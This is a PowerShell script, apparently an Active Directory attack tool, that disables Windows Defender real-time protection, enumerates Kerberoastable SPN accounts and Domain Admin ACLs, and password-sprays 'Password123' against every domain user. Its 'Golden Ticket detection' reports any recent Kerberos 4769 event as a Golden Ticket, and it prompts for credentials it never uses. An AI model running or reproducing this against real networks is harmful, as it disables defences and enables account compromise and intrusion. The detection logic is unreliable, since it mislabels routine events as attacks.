# Configuration for logging
$logFile = "adkaveh.log"

function Log-Activity {
    param (
        [string]$message
    )
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logMessage = "$timestamp - $message"
    Add-Content -Path $logFile -Value $logMessage
    Write-Host "[LOG] $message" -ForegroundColor Yellow
}

# Temporarily disable Windows Defender
function Disable-WindowsDefender {
    Log-Activity "Disabling Windows Defender temporarily..."
    try {
        Set-MpPreference -DisableRealtimeMonitoring $true
        Log-Activity "Windows Defender has been temporarily disabled."
    } catch {
        Log-Activity "Failed to disable Windows Defender: $_"
    }
}

# Collect Kerberoasting information (without Impacket)
function Invoke-KerberoastingScan {
    Log-Activity "Starting Kerberoasting scan..."
    try {
        # Use native PowerShell cmdlets to find Service Principal Names (SPNs)
        $spnAccounts = Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName
        if ($spnAccounts) {
            foreach ($account in $spnAccounts) {
                Log-Activity "Found SPN account: $($account.SamAccountName)"
                $account.ServicePrincipalName | ForEach-Object { Log-Activity "SPN: $_" }
            }
            Log-Activity "Kerberoasting scan completed."
        } else {
            Log-Activity "No SPN accounts found."
        }
    } catch {
        Log-Activity "Kerberoasting scan failed: $_"
    }
}

# Check ACL (Access Control List) for abuses (without PowerView)
function Invoke-ACLAbuseScan {
    Log-Activity "Starting ACL Abuse scan..."
    try {
        # Use native PowerShell cmdlets to check ACLs
        $domainAdmins = Get-ADGroupMember -Identity "Domain Admins"
        foreach ($admin in $domainAdmins) {
            $acl = Get-Acl -Path "AD:\$($admin.DistinguishedName)"
            $acl.Access | ForEach-Object {
                if ($_.ActiveDirectoryRights -match 'WriteProperty') {
                    Log-Activity "Potential ACL abuse detected for $($admin.SamAccountName): $($_.ActiveDirectoryRights)"
                }
            }
        }
        Log-Activity "ACL Abuse scan completed."
    } catch {
        Log-Activity "ACL Abuse scan failed: $_"
    }
}

# Password Spraying Attack
function Invoke-PasswordSprayingAttack {
    Log-Activity "Starting Password Spraying attack..."
    try {
        # List of users
        $users = Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName
        # Test password
        $testPassword = "Password123"
        foreach ($user in $users) {
            Log-Activity "Trying password for user: $user"
            $securePassword = ConvertTo-SecureString $testPassword -AsPlainText -Force
            $credential = New-Object System.Management.Automation.PSCredential($user, $securePassword)
            try {
                Invoke-Command -ComputerName $env:COMPUTERNAME -Credential $credential -ScriptBlock { whoami } -ErrorAction Stop
                Log-Activity "Successful login for user: $user"
            } catch {
                Log-Activity "Failed login for user: $user"
            }
        }
    } catch {
        Log-Activity "Password Spraying attack failed: $_"
    }
}

# Detect Golden Ticket
function Invoke-GoldenTicketDetection {
    Log-Activity "Starting Golden Ticket detection..."
    try {
        # Check security events related to Kerberos
        $events = Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4769} -MaxEvents 10 -ErrorAction SilentlyContinue
        if ($events) {
            $events | ForEach-Object { Log-Activity "Golden Ticket detected: $($_.Message)" }
        } else {
            Log-Activity "No Golden Ticket events found."
        }
    } catch {
        Log-Activity "Golden Ticket detection failed: $_"
    }
}

# Main script execution

# Get domain information
$domainName = Read-Host "Enter the domain name"
$username = Read-Host "Enter the username"
$password = Read-Host "Enter the password" -AsSecureString

try {
    # Temporarily disable Windows Defender
    Disable-WindowsDefender

    # Gather generic AD info
    Log-Activity "Gathering generic AD info..."
    Write-Host "Domain Name: $env:USERDOMAIN"
    Write-Host "DNS Domain Name: $env:USERDNSDOMAIN"
    Write-Host "Logon Server: $env:LOGONSERVER"
    Write-Host "DNS Host Name: $(hostname)"
    Write-Host "Computer Name: $(hostname)"

    # Run advanced scans
    Invoke-KerberoastingScan
    Invoke-ACLAbuseScan
    Invoke-PasswordSprayingAttack
    Invoke-GoldenTicketDetection

} catch {
    Log-Activity "An error occurred: $_"
}
